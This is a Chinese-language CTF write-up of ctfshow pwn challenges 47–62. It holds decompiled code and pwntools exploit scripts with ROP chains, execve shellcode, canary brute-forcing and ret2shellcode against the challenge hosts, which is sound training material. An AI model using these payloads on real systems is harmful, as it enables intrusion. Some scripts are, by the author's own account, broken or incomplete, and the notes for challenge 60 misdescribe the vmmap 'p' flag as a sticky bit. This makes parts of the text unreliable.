好了，拿到了他的地址就方便了，之后直接python程序获取一下system程序的位置然后输出就行了

记得通过这几个值定位一下是哪一个libc，最终找到是`libc6-i386_2.27-3ubuntu1_amd64`

```python
from pwn import *
from LibcSearcher import *
 
# 配置环境
context(os='linux', arch='i386')
 
# 连接目标
# io = process('./pwn')  # 本地测试
io = remote('pwn.challenge.ctf.show', 28290)
# 加载ELF文件
elf = ELF(r"C:\Users\zuziyi\Desktop\study\pwn\栈溢出\47\pwn")
 
# 接收泄漏的puts地址
io.recvuntil("puts: ")
puts_addr = int(io.recvline().strip(), 16)  # 更安全的地址解析
log.success(f"Leaked puts address: {hex(puts_addr)}")
 
#接收binsh地址
io.recvuntil("gift: ")
bin_sh_addr = int(io.recvline().strip(), 16)
log.success(f"Leaked /bin/sh address: {hex(bin_sh_addr)}")
 
# 查找匹配的libc版本
# libc = LibcSearcher("puts", puts_addr)
libc_base = puts_addr - 0x067360
system_addr = libc_base + 0x03cd10
log.info(f"Libc base: {hex(libc_base)}")
log.info(f"System address: {hex(system_addr)}")
 
 
# 构造payload (32位系统)
payload = flat(
    b'A' * (0x9c + 4),  # 填充到返回地址
    p32(system_addr),    # 覆盖返回地址为system
    p32(0),     # system的返回地址(随意填充)
    p32(bin_sh_addr)     # system的参数
)
 
# 发送payload
io.sendline(payload)
io.interactive()  # 进入交互模式
```

payload构建方式就是最基础的32位构建方式，system+返回地址+bin/sh

## 48

耶嘿，32位系统，打开看一下

```python
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(&argc);
  logo();
  puts("O.o?");
  ctfshow();
  return 0;
}
```

```python
ssize_t ctfshow()
{
  _BYTE buf[103]; // [esp+Dh] [ebp-6Bh] BYREF

  return read(0, buf, 0xC8u);
}
```

看起来很轻松的样子，第一步直接构建payload区puts它本身的got表的地址

这一步其实可以直接从ida里面读出来，并不需要之前那个函数库进行自己分析

![1766457677236-c119d8da-c761-45d8-bc82-95db7c1891a0.png](./img/I9qdj-CFnaq3QouQ/1766457677236-c119d8da-c761-45d8-bc82-95db7c1891a0-856722.png)

在这里可以直接看出来puts函数的plt地址和got地址， 但在 ROP 里“泄露 puts 真地址”时，是通过 **读取 **<code>**puts@got**</code>** 槽位的内容**得到的——那个才是 libc 地址。

正常情况下输入plt地址会调用函数，输入got地址会输出libc表的相应位置

```python
from pwn import *
from LibcSearcher import *
# context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28247)
 
# elf = ELF(r"C:\Users\zuziyi\Desktop\study\pwn\栈溢出\48\pwn")
# main = elf.sym['main']
# puts_got = elf.got['puts']
# puts_plt = elf.plt['puts']

main = 0x0804863D
puts_got = 0x0804A010
puts_plt = 0x08048370
# print(hex(main))
# print(hex(puts_got))
# print(hex(puts_plt))
payload = cyclic(0x6b+4) + p32(puts_plt) + p32(main) + p32(puts_got)
 
io.recvuntil(b'O.o?')
io.sendline(payload)
puts = u32(io.recvuntil(b'\xf7')[-4:])
print(hex(puts))
 
 
libc = LibcSearcher('puts',puts)
libc_base = puts - libc.dump('puts')
system = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
 
payload = cyclic(0x6b+4) + p32(system) + p32(main) + p32(bin_sh)
io.sendline(payload)
io.recv()
io.interactive()
```

这个代码应该能跑同，但是问题是libc库测了几个测不出来，不知道为什么

## 49

<font style="color:rgb(77, 77, 77);">分析程序所开启的保护，该程序是32位的程序，开启了RELRO之外，还开启了</font><font style="color:rgb(78, 161, 219) !important;">Canary</font><font style="color:rgb(77, 77, 77);">和NX保护。(实际上并没有Canary保护，老版本只要识别到了</font>**<font style="color:rgb(77, 77, 77);">\_stack\_chk\_fail\_local</font>**<font style="color:rgb(77, 77, 77);">函数就默认开启了Canary)</font>

<font style="color:rgb(77, 77, 77);">file ./pwn：</font>

<font style="color:rgb(77, 77, 77);">动态链接（最常见）会出现 dynamically linked，并且常带 interpreter ... ld-linux...：</font>

<font style="color:rgb(77, 77, 77);">ELF 64-bit LSB pie executable, x86-64, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, ...</font>

<font style="color:rgb(77, 77, 77);">静态链接会明确写 statically linked：</font>

<font style="color:rgb(77, 77, 77);">ELF 64-bit LSB executable, x86-64, statically linked, ...</font>

<font style="color:rgb(77, 77, 77);">如果你看到 statically linked 基本就可以直接判定是静态链接。</font>

<font style="color:rgb(77, 77, 77);">所谓的静态编译没什么唬人的，其实就是把libc库内置进了程序之中，会导致编译的时候出现很多并没有用的代码和名称相似的代码来混淆你的视野</font>

*<font style="color:rgb(77, 77, 77);">你看见左边这一列比我命还长的函数的时候就应该知道这个鬼东西是静态的了</font>*

静态编译是指在编译程序时，将所有需要的库函数代码直接嵌入到最终的可执行文件中，而不\_\_是在运行时动态链接外部共享库。以下是静态/动态编译之间的差异。

![1766460780955-76efe6fd-fd0f-48b5-8849-540d74aa1b42.png](./img/I9qdj-CFnaq3QouQ/1766460780955-76efe6fd-fd0f-48b5-8849-540d74aa1b42-977739.png)

注意一下在静态环境中，函数往往是只可读而不可运行的，所以运行的时候会出错，所以需要翻看一下内存找一下内存权限

```python
gdb pwn
break main//随便设置一个断点，确保程序能跑起来
vmmap
```

![1766488439387-e79cf474-eb0f-4da9-8952-0e1b15712d0f.png](./img/I9qdj-CFnaq3QouQ/1766488439387-e79cf474-eb0f-4da9-8952-0e1b15712d0f-820211.png)

**r** = readable：可读

**w** = writable：可写

**x** = executable：可执行（能当代码跑）

**p** = private（私有映射，写时复制 COW）

**s** = shared（共享映射）

先构建payload

```python
payload = cyclic(0x12+4) + p32(address_mprotect) + p32(ret_address) + p32(mprotect_addr) +
p32(mprotect_len) + p32(mprotect_prot)
```

<font style="color:rgb(77, 77, 77);">在IDA内shift+f7，查看程序的段表，将.got.plt地址</font>**<font style="color:rgb(77, 77, 77);">0x80DA000</font>**<font style="color:rgb(77, 77, 77);">地址开始修改为可读可写可执行</font>

注意为什么是.got.plt表，因为他放的是“要跳到哪里去执行”这类指针（地址）**，也就是**外部函数解析后的入口地址缓存。

![1766489621728-548b1b1e-2885-49eb-a076-22ab99194f4c.png](./img/I9qdj-CFnaq3QouQ/1766489621728-548b1b1e-2885-49eb-a076-22ab99194f4c-965027.png)

libc库里面的函数在程序中存储的位置是.text表中，所以我们并不需要更改他的权限，他本来就行执行。

正常情况下程序在运行的时候是根据地址跳转到响应地址然后执行，注意一下这里面所有的东西都需要有执行权限，所以我们就需要把这里面的.got.plt表格设定为有执行权限。

```python
address_mprotect = 0x0806cdd0
ret_address = 0x08056194
mprotect_addr = 0x80DA000
mprotect_len = 0x1000
mprotect_prot = 0x7
payload = cyclic(0x12+4) + p32(address_mprotect) + p32(ret_address) + p32(mprotect_addr) +
p32(mprotect_len) + p32(mprotect_prot)
```

下一步是read函数

```python
#include <unistd.h>
ssize_t read(int fd, void *buf, size_t count);
```

fd - 文件描述符 (int类型)：

指定数据来源的文件描述符，0代表从标准输入读取。

buf - 缓冲区地址 (void\*类型)：

数据存储的目标内存地址，指向接收数据的缓冲区。也就是传入shellcode的地址

count - 读取字节数 (size\_t类型)：

最大读取字节数，控制一次读取的数据量大小。需要确保够读入shellcode

这个read函数可以读取一个东西然后存放在指定位置

所以思路是先更改一下权限，然后read一个东西进去，最后直接跳转到这个地址执行这个鬼东西

给出payload

```python
from pwn import *
# 设置环境：32位x86架构，Linux系统，开启调试信息输出
context(arch = 'i386',os = 'linux',log_level = 'debug')
 
# 连接目标程序 - 远程主机192.168.204.134的10002端口
#io = process('./pwn')  # 本地测试用的注释代码
io = remote('192.168.204.134',10002)
 
# ====== 第一阶段：设置mprotect调用参数 ======
address_mprotect = 0x0806cdd0  # mprotect函数在内存中的地址
ret_address = 0x08056194       # ROP gadget地址 (pop eax ; pop edx ; pop ebx ; ret)
mprotect_addr = 0x80DA000      # 要修改权限的内存区域地址（必须页对齐）
mprotect_len = 0x1000          # 内存区域大小（必须是页大小的整数倍，这里是4096字节）
mprotect_prot = 0x7            # 权限标志：7 = PROT_READ|PROT_WRITE|PROT_EXEC (可读可写可执行)
 
# 构建ROP链的第一部分：缓冲区溢出 + mprotect调用
payload = cyclic(0x12+4)                   # 填充缓冲区直到返回地址 (18字节缓冲区+4字节保存的EBP)
payload += p32(address_mprotect)           # 覆盖返回地址，跳转到mprotect函数
payload += p32(ret_address)                # mprotect执行后的返回地址（ROP gadget）
payload += p32(mprotect_addr)              # mprotect参数1：要修改权限的内存地址
payload += p32(mprotect_len)               # mprotect参数2：内存区域大小
payload += p32(mprotect_prot)              # mprotect参数3：权限标志
 
# ====== 第二阶段：设置read调用参数 ======
address_read = 0x806bee0                   # read函数在内存中的地址
 
# 继续构建ROP链的第二部分：read调用
payload += p32(address_read)               # 调用read函数读取shellcode
payload += p32(ret_address)                # read执行后的返回地址（同样是ROP gadget）
payload += p32(0)                          # read参数1：文件描述符（0=标准输入）
payload += p32(mprotect_addr)              # read参数2：缓冲区地址（shellcode存放位置）
payload += p32(0x1000)                     # read参数3：读取字节数（4096字节）
payload += p32(mprotect_addr)              # ROP gadget执行后跳转到的地址（执行shellcode）
 
# ====== 第三阶段：生成并发送shellcode ======
# 生成获取shell的机器码（32位Linux系统）
shellcode = (
    b"\x31\xc0"          # xor eax,eax
    b"\x50"              # push eax
    b"\x68\x2f\x2f\x73\x68"  # push "//sh"
    b"\x68\x2f\x62\x69\x6e"  # push "/bin"
    b"\x89\xe3"          # mov ebx,esp
    b"\x31\xc9"          # xor ecx,ecx
    b"\x31\xd2"          # xor edx,edx
    b"\xb0\x0b"          # mov al,0xb
    b"\xcd\x80"          # int 0x80
)
#等价于生成execve("/bin/sh", NULL, NULL);

# 发送攻击载荷
io.sendline(payload)    # 发送ROP链触发漏洞
io.sendline(shellcode)  # 发送shellcode到目标程序
 
# 进入交互模式，获取目标系统的shell控制权
io.interactive()
```

尽力了，还是调不出来，下一道题目了

## 50

先检查一下是个什么东西

![1766492031432-d8aa312d-3318-4d59-a8f3-a5d9a5714ceb.png](./img/I9qdj-CFnaq3QouQ/1766492031432-d8aa312d-3318-4d59-a8f3-a5d9a5714ceb-076825.png)

64位，动态链接

既然是动态那就检查一下libc版本

![1766492193381-12fc5ac0-3266-4e0d-8c94-6e68d564f9d4.png](./img/I9qdj-CFnaq3QouQ/1766492193381-12fc5ac0-3266-4e0d-8c94-6e68d564f9d4-983618.png)

IDA打开进入ctfshow函数，发现溢出，可以构建漏洞

思路很明确，覆盖函数地址然后直接输出puts地址，找一下偏移就行了

```python
from pwn import *
 
context(arch='amd64', os='linux', log_level='debug')
io = process('./pwn')
# io = remote('192.168.79.134', 10001)
elf = ELF('./pwn')
 
pop_rdi_ret = 0x00000000004007e3  # pop rdi ; ret gadget
ret_gadget = 0x00000000004004fe   # 单独的ret指令，用于栈对齐
 
main = elf.sym['main']
put_plt= 
put_got= 

print(f"main function address: {hex(main)}")
 
# 第一步：泄露libc地址
payload = cyclic(40)
payload += p64(pop_rdi_ret)
payload += p64(elf.got['puts'])  # 将puts的GOT地址作为参数
payload += p64(elf.plt['puts'])  # 调用puts打印puts的实际地址
payload += p64(main)             # 返回main函数重新开始
 
io.sendlineafter(b"Hello CTFshow", payload)  # 等待提示后发送
 
# 接收泄露的地址
io.recvline()  # 丢弃第一行
leak_data = io.recvline().strip()  # 获取泄露的地址行
puts_addr = u64(leak_data.ljust(8, b'\x00'))
 
print(f"Leaked puts address: {hex(puts_addr)}")
 
# 计算libc基地址
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_base = puts_addr - libc.sym['puts']
print(f"Libc base address: {hex(libc_base)}")
 
# 计算system和/bin/sh地址
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
 
print(f"System address: {hex(system_addr)}")
print(f"/bin/sh address: {hex(binsh_addr)}")
 
# 第二步：调用system("/bin/sh")
# 在64位系统中，需要确保栈对齐，添加一个ret指令
payload = cyclic(40)
payload += p64(ret_gadget)      # 栈对齐用的ret指令
payload += p64(pop_rdi_ret)     # pop rdi gadget
payload += p64(binsh_addr)      # /bin/sh字符串地址
payload += p64(system_addr)     # system函数地址
 
io.sendlineafter(b"Hello CTFshow", payload)  # 再次等待提示后发送
 
# 获取shell
io.interactive()
```

还是之前的那个问题，根本开不出来是哪一个libc文件

## 51

```plain
int sub_8049059()
{
  int v0; // eax
  int v1; // eax
  unsigned int v2; // eax
  int v3; // eax
  const char *v4; // eax
  int v6; // [esp-Ch] [ebp-84h]
  int v7; // [esp-8h] [ebp-80h]
  _BYTE v8[12]; // [esp+0h] [ebp-78h] BYREF
  char s[32]; // [esp+Ch] [ebp-6Ch] BYREF
  _BYTE v10[24]; // [esp+2Ch] [ebp-4Ch] BYREF
  _BYTE v11[24]; // [esp+44h] [ebp-34h] BYREF
  unsigned int i; // [esp+5Ch] [ebp-1Ch]

  memset(s, 0, sizeof(s));
  puts("Who are you?");
  read(0, s, 0x20u);
  std::string::operator=(&unk_804D0A0, &unk_804A350);
  std::string::operator+=(&unk_804D0A0, s);
  std::string::basic_string(v10, &unk_804D0B8);
  std::string::basic_string(v11, &unk_804D0A0);
  sub_8048F06(v8);
  std::string::~string(v11, v11, v10);
  std::string::~string(v10, v6, v7);
  if ( sub_80496D6(v8) > 1u )
  {
    std::string::operator=(&unk_804D0A0, &unk_804A350);
    v0 = sub_8049700(v8, 0);
    if ( (unsigned __int8)sub_8049722(v0, &unk_804A350) )
    {
      v1 = sub_8049700(v8, 0);
      std::string::operator+=(&unk_804D0A0, v1);
    }
    for ( i = 1; ; ++i )
    {
      v2 = sub_80496D6(v8);
      if ( v2 <= i )
        break;
      std::string::operator+=(&unk_804D0A0, "IronMan");
      v3 = sub_8049700(v8, i);
      std::string::operator+=(&unk_804D0A0, v3);
    }
  }
  v4 = (const char *)std::string::c_str(&unk_804D0A0);
  strcpy(s, v4);
  printf("Wow!you are:%s", s);
  return sub_8049616(v8);
}
```

有漏洞，但是我第一眼看不出来

其实这个程序的逻辑是把所有的I更改成IronMan

所以通过这个可以进行栈溢出

偏移量是0x6c+4就是0x70

IronMan是7个字符

所以说offset就是16位

加上寄存器的名字可以看出来这个函数是32位

## 52

这道题目里面有一个flag函数，可以直接从里面获取到flag

```python
payload = flat(
    b"A" * offset,
    flag,
    0,
    0x36C,
    0x36D,
)
```

注意一下传参方式，在32位的系统中先执行flag函数，参数是36C和36D，最后是返回到一个空值，但是问题是已经不需要了

## 53

```c
int ctfshow()
{
  size_t nbytes; // 用户输入的长度，后面会直接作为 read 的第三个参数使用
  _BYTE v2[32];  // 暂存长度字符串，例如 "64"
  _BYTE buf[32]; // 实际写入数据的栈缓冲区，只有 32 字节
  int s1;        // 保存进入函数时的 canary 副本，函数末尾用于校验栈是否被破坏
  int v5;        // 循环下标，用于逐字节读取长度字符串

  v5 = 0;
  s1 = global_canary; // 进入函数时先把全局 canary 备份到栈上
  printf("How many bytes do you want to write to the buffer?\n>");
  while (v5 <= 31)
  {
    read(0, &v2[v5], 1u);  // 从标准输入逐字节读取长度
    if (v2[v5] == 10)      // 遇到换行就结束，10 即 '\n'
      break;               // 注意：这里没有手动补 '\0'，依赖栈上原始内容/输入行为
    ++v5;
  }
  __isoc99_sscanf(v2, "%d", &nbytes); // 把字符串转换成整数长度
  printf("$ ");
  read(0, buf, nbytes); // 漏洞点：buf 只有 32 字节，但 nbytes 完全由用户控制，可导致栈溢出
  if (memcmp(&s1, &global_canary, 4u))
  {
    // 如果溢出覆盖了 canary，这里会检测到并直接退出
    puts("Error *** Stack Smashing Detected *** : Canary Value Incorrect!");
    exit(-1);
  }
  // canary 校验通过后正常结束函数
  puts("Where is the flag?");
  return fflush(stdout);
}
```

查看ctfshow函数，发现这里v2可以直接自定义长度，所以可以构成栈溢出漏洞

但是会检测有没有覆盖canary，如果检测了会自动推出

然后构造payload

```python
from pwn import *


HOST = "pwn.challenge.ctf.show"
PORT = 28299


canary = b""
for _ in range(4):
    for guess in range(256):
        p = remote(HOST, PORT)
        p.sendlineafter(b">", b"200")

        payload = cyclic(0x30 - 0x10) + canary + p8(guess)
        p.sendafter(b"$ ", payload)

        answer = p.recv()
        if b"Canary Value Incorrect!" not in answer:
            canary += p8(guess)
            p.close()
            break

        p.close()


p = remote(HOST, PORT)
elf = ELF("./pwn")
flag = elf.sym["flag"]

payload = cyclic(0x30 - 0x10) + canary + p32(0) * 4 + p32(flag)
p.sendlineafter(b">", b"-1")
p.sendafter(b"$ ", payload)
p.interactive()
```
## 54
查看一下源代码
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s1[64]; // [esp+0h] [ebp-1A0h] BYREF
  char v5[256]; // [esp+40h] [ebp-160h] BYREF
  char s[64]; // [esp+140h] [ebp-60h] BYREF
  FILE *stream; // [esp+180h] [ebp-20h]
  char *v8; // [esp+184h] [ebp-1Ch]
  int *p_argc; // [esp+194h] [ebp-Ch]

  p_argc = &argc;
  setvbuf(stdout, 0, 2, 0);
  memset(s, 0, sizeof(s));
  memset(v5, 0, sizeof(v5));
  memset(s1, 0, sizeof(s1));
  puts("==========CTFshow-LOGIN==========");
  puts("Input your Username:");
  fgets(v5, 256, stdin);
  v8 = strchr(v5, 10);
  if ( v8 )
    *v8 = 0;
  strcat(v5, ",\nInput your Password.");
  stream = fopen("/password.txt", "r");
  if ( !stream )
  {
    puts("/password.txt: No such file or directory.");
    exit(0);
  }
  fgets(s, 64, stream);
  printf("Welcome ");
  puts(v5);
  fgets(s1, 64, stdin);
  v5[0] = 0;
  if ( !strcmp(s1, s) )
  {
    puts("Welcome! Here's what you want:");
    flag();
  }
  else
  {
    puts("You has been banned!");
  }
  return 0;
}
```
发现里面有溢出代码
`strcat(v5, ",\nInput your Password.");`
发现这个代码里面存在这往v5里面加一段字符串
但是看一下上面的读取，发现是读取256个字符
所以说v5是可以直接顶满的，而往里面加东西就会直接溢出到下一个字符串里面
下一个字符串是s
之后是s从`stream`里面获取值
```python
from pwn import *

  

context(os='linux', arch='i386', log_level='debug')

io = remote('pwn.challenge.ctf.show', 28176)

  

payload = b'a' * (256 - 22)

io.sendlineafter(b'Username:', payload)

  

io.recvuntil(b'Input your Password.')

pwd = io.recvline().strip()

  

io.sendline(pwd)

io.interactive()
```
但是我们可以发现输出里面有一串鬼东西：
CTFshow_PWN_r00t_p@ssw0rd_1s_h3r3
至于为什么会有这串鬼东西，是因为我们构造的输入是没有/0的
而puts会一直输出一直到输出/0为止，所以直接把下一个字符串也输出了。。。
所以能直接看到s的值
## 55
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  logo(&argc);
  puts("How to find flag?");
  ctfshow();
  return 0;
}
char *ctfshow()
{
  char s[40]; // [esp+Ch] [ebp-2Ch] BYREF

  printf("Input your flag: ");
  return gets(s);
}
```
这个未免有点太简略了吧
发现有一个flag函数，直接跳转到flag函数吧
```c
int __cdecl flag(int a1)
{
  char s[48]; // [esp+Ch] [ebp-3Ch] BYREF
  FILE *stream; // [esp+3Ch] [ebp-Ch]

  stream = fopen("/ctfshow_flag", "r");
  if ( !stream )
  {
    puts("/ctfshow_flag: No such file or directory.");
    exit(0);
  }
  fgets(s, 48, stream);
  if ( flag1 && flag2 && a1 == -1111638595 )
    return printf("%s", s);
  if ( flag1 && flag2 )
    return puts("Incorrect Argument.");
  if ( flag1 || flag2 )
    return puts("Nice Try!");
  return puts("Flag is not here!");
}
```
还有第二关，flag函数内部的事情
不是这个是什么鬼东西啊
发现还有两个函数，分别是flag_func1和flag_func2
那么直接打开这两个函数看一下就是了
```c
Elf32_Dyn **flag_func1()
{
  flag1 = 1;
  return &GLOBAL_OFFSET_TABLE_;
}
```

```c
Elf32_Dyn **__cdecl flag_func2(int a1)
{
  Elf32_Dyn **result; // eax

  result = &GLOBAL_OFFSET_TABLE_;
  if ( flag1 && a1 == -1397969748 )
  {
    flag2 = 1;
  }
  else if ( flag1 )
  {
    return (Elf32_Dyn **)puts("Try Again.");
  }
  else
  {
    return (Elf32_Dyn **)puts("Try a little bit.");
  }
  return result;
}
```

可以很明显的发现可以先调用flag_func1然后再调用flag_func2
最重要的是确保a1的值
a1时flag_func2传入的参数，所以只需要放在下下个位置就行了
然后就是调用flag函数了，其中a1也是参数，所以也放在下下个位置就行了
调用链：
offset + flag_func1 + flag_func2 + flag + -1397969748 + -1111638595
注意，多个函数如果不能拼在一起的话就只能用ret了
```python
payload = flat(  
b'A' * offset,  
  
func1,  
pop_ret,  
arg1,  
  
func2,  
pop_ret,  
arg2,  
  
func3,  
pop_ret,  
arg3,  
  
func4,  
next_addr,  
arg4  
)
```
最终给出代码
```python
from pwn import *

  

context(os='linux', arch='i386', log_level='debug')

  

io = remote('pwn.challenge.ctf.show', 28272)   # 端口按你题目当前实例改

elf = ELF('./pwn')

  

flag_func1 = elf.sym['flag_func1']

flag_func2 = elf.sym['flag_func2']

flag       = elf.sym['flag']

  

payload = flat(

    b'a' * 48,

    flag_func1,

    flag_func2,

    flag,

    0xACACACAC,

    0xBDBDBDBD

)

  

io.sendline(payload)

io.interactive()
```
## 56
```c
void __noreturn start()
{
  int v0; // eax
  char v1[10]; // [esp-Ch] [ebp-Ch] BYREF
  __int16 v2; // [esp-2h] [ebp-2h]

  v2 = 0;
  strcpy(v1, "/bin///sh");
  v0 = sys_execve(v1, 0, 0);
}
```
有且仅有这一段代码
不是我main函数呢？
在linux里面，多个/被视为一个/
但是看起来直接链接就行了，直接下一题
## 57
```c
void __noreturn start()
{
  __asm { syscall; LINUX - }
}
```
完了，看起来更加奇怪了
但是实际上还是只要直接连接就行了
这一行执行的是系统调用，但是调用什么还是看寄存器里面的值
但是这里寄存器信息没有给我们，只能蒙一下
## 58
打开IDA，反编译发现失败了
直接看代码
```
; Attributes: bp-based frame fuzzy-sp

; int __cdecl main(int argc, const char **argv, const char **envp)
public main
main proc near

s= byte ptr -0A0h
var_C= dword ptr -0Ch
argc= dword ptr  8
argv= dword ptr  0Ch
envp= dword ptr  10h

; __unwind {
lea     ecx, [esp+4]
and     esp, 0FFFFFFF0h
push    dword ptr [ecx-4]
push    ebp
mov     ebp, esp
push    ebx
push    ecx
sub     esp, 0A0h
call    __x86_get_pc_thunk_bx
add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)
mov     eax, ds:(stdout_ptr - 804A000h)[ebx]
mov     eax, [eax]
push    0               ; n
push    2               ; modes
push    0               ; buf
push    eax             ; stream
call    _setvbuf
add     esp, 10h
call    _getegid
mov     [ebp+var_C], eax
sub     esp, 4
push    [ebp+var_C]
push    [ebp+var_C]
push    [ebp+var_C]
call    _setresgid
add     esp, 10h
call    logo
sub     esp, 0Ch
lea     eax, (aJustVeryEasyRe - 804A000h)[ebx] ; "Just very easy ret2shellcode&&32bit"
push    eax             ; s
call    _puts
add     esp, 10h
sub     esp, 0Ch
lea     eax, (aAttachIt - 804A000h)[ebx] ; "Attach it!"
push    eax             ; s
call    _puts
add     esp, 10h
sub     esp, 0Ch
lea     eax, [ebp+s]
push    eax             ; s
call    ctfshow
add     esp, 10h
lea     eax, [ebp+s]
call    eax
mov     eax, 0
lea     esp, [ebp-8]
pop     ecx
pop     ebx
pop     ebp
lea     esp, [ecx-4]
retn
; } // starts at 804864C
main endp

```
call    eax
注意一下这一行代码，发现是调用eax寄存器的函数
但是这个函数我根本不知道是什么，说不定还需要自定义
烦啊。。。
好了，让AI反编译好了
```c
int main()
{
    char s[0xA0];
    gid_t egid;

    setvbuf(stdout, 0, 2, 0);
    egid = getegid();
    setresgid(egid, egid, egid);

    logo();
    puts("Just very easy ret2shellcode&&32bit");
    puts("Attach it!");

    ctfshow(s);          // 输入到 s
    ((void(*)())s)();    // 执行 s 中的 shellcode
}
```
除此以外好像就是一个正常的栈溢出的题目
利用流程就两步：
1.生成 32 位 shellcode
asm(shellcraft.sh())
这会生成一段 32 位 `/bin/sh` shellcode。
2.发送 shellcode
程序把你输入写进 `s` 后，直接 `call s`，所以你只要发 shellcode 即可。
```python
from pwn import *

context(os='linux', arch='i386', log_level='debug')

p = remote('pwn.challenge.ctf.show', 端口)

payload = asm(shellcraft.sh())

p.sendline(payload)
p.interactive()
```
连上之后找到ctfshow_flag这个文件就行了
## 59
和上一道题目一模一样，只不过是换成了64位
所以只需要更换一下payload写法就行了
64位shellcode
```python
payload = (

    b"\x48\x31\xf6"                                  # xor rsi, rsi

    b"\x56"                                          # push rsi

    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"      # mov rdi, 0x68732f2f6e69622f

    b"\x57"                                          # push rdi

    b"\x54"                                          # push rsp

    b"\x5f"                                          # pop rdi

    b"\x6a\x3b"                                      # push 59

    b"\x58"                                          # pop rax

    b"\x99"                                          # cdq

    b"\x0f\x05"                                      # syscall

)
```
这样就行了
## 60
先看原程序

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("CTFshow-pwn can u pwn me here!!");
  gets(s);
  strncpy(buf2, s, 0x64u);
  printf("See you ~");
  return 0;
}
```
可以看到这个里面有很明显的把s的64位复制到buf2里面的操作
所以可以利用buf2放shellcode
- 把 shellcode 放在输入前面
- 利用程序自己把 shellcode 复制到 buf2
- 覆盖返回地址为 0x804a080

注意这道题目开了NX，就是说不允许栈空间内执行函数
所以我们只能把函数放到栈空间之外的空间执行，而不是直接在函数栈里面执行
查看vmmap
```
     Start        End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
 0x8048000  0x8049000 r-xp     1000       0 pwn
 0x8049000  0x804a000 r--p     1000       0 pwn
 0x804a000  0x804b000 rw-p     1000    1000 pwn
 0x804b000  0x806d000 rw-p    22000       0 [heap]
0xf7d60000 0xf7d84000 r--p    24000       0 /usr/lib32/libc.so.6
0xf7d84000 0xf7f0e000 r-xp   18a000   24000 /usr/lib32/libc.so.6
0xf7f0e000 0xf7f92000 r--p    84000  1ae000 /usr/lib32/libc.so.6
0xf7f92000 0xf7f94000 r--p     2000  231000 /usr/lib32/libc.so.6
0xf7f94000 0xf7f95000 rw-p     1000  233000 /usr/lib32/libc.so.6
0xf7f95000 0xf7f9f000 rw-p     a000       0 [anon_f7f95]
0xf7fbc000 0xf7fbe000 rw-p     2000       0 [anon_f7fbc]
0xf7fbe000 0xf7fc2000 r--p     4000       0 [vvar]
0xf7fc2000 0xf7fc4000 r--p     2000       0 [vvar_vclock]
0xf7fc4000 0xf7fc6000 r-xp     2000       0 [vdso]
0xf7fc6000 0xf7fc7000 r--p     1000       0 /usr/lib32/ld-linux.so.2
0xf7fc7000 0xf7fec000 r-xp    25000    1000 /usr/lib32/ld-linux.so.2
0xf7fec000 0xf7ffb000 r--p     f000   26000 /usr/lib32/ld-linux.so.2
0xf7ffb000 0xf7ffd000 r--p     2000   34000 /usr/lib32/ld-linux.so.2
0xf7ffd000 0xf7ffe000 rw-p     1000   36000 /usr/lib32/ld-linux.so.2
0xfffdd000 0xffffe000 rwxp    21000       0 [stack]

```
其中buf2的地址在0x804a080
1. **r（read）**
    - 文件：可以**查看内容**
    - 目录：可以**列出里面的文件**
2. **w（write）**
    - 文件：可以**修改、删除、重命名**
    - 目录：可以**在里面创建 / 删除文件**
3. **x（execute）**
    - 文件：可以**运行程序**
    - 目录：可以**进入目录**（cd）
4. **p（Sticky Bit，粘贴位）**
    - 只用在**公共目录**（比如 /tmp）
    - 作用：**只有文件所有者、目录所有者、root 才能删除该文件**

```python
from pwn import *

context(os='linux', arch='i386', log_level='debug')

  

buf2_addr = 0x804a080

shellcode = b"\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80"

payload = shellcode.ljust(112, b'a') + p32(buf2_addr)

  

p = remote('pwn.challenge.ctf.show', 28135)

p.sendline(payload)

p.interactive()
```

## 61
先checksec一下，发现64位程序，打开了PIE
```
pwndbg> checksec
File:     /mnt/hgfs/share/pwn/栈溢出/61/pwn
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        PIE enabled
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```
PIE是指主函数的地址随机，这种情况下程序整体平移，需要先算出来偏移值然后才能找到基址
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rdi
  _QWORD v5[2]; // [rsp+0h] [rbp-10h] BYREF

  v5[0] = 0;
  v5[1] = 0;
  v3 = stdout;
  setvbuf(stdout, 0, 1, 0);
  logo(v3, 0);
  puts("Welcome to CTFshow!");
  printf("What's this : [%p] ?\n", v5);
  puts("Maybe it's useful ! But how to use it?");
  gets(v5);
  return 0;
}
```
这里直接把v5的地址输出了
应该是可以劫持shellcode，改到v5的地址，然后改到v5的地址执行的
但是看一下源代码
这一道题目不能直接使用shellcode的原因是
然后因为buf的长度太短，所以不能把shellcode放到buf里面然后再执行
所以我们先从里面读取buf的值，然后输出offset，输出but+0x20，最后输入offset就行了
shellcode是不能直接跟在栈后面执行的，因为太长了，栈只读取一半就会被截断
所以最终代码：
```python
padding = 0x10+8
shell_code = asm(shellcraft.sh())
io.recvuntil("What's this : [")
v5_addr = eval(io.recvuntil("]",drop=True))
print(v5_addr)
print(hex(v5_addr))
payload = flat([cyclic(padding),v5_addr+padding+8,shell_code])

```

## 62
先看一下代码
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rdi
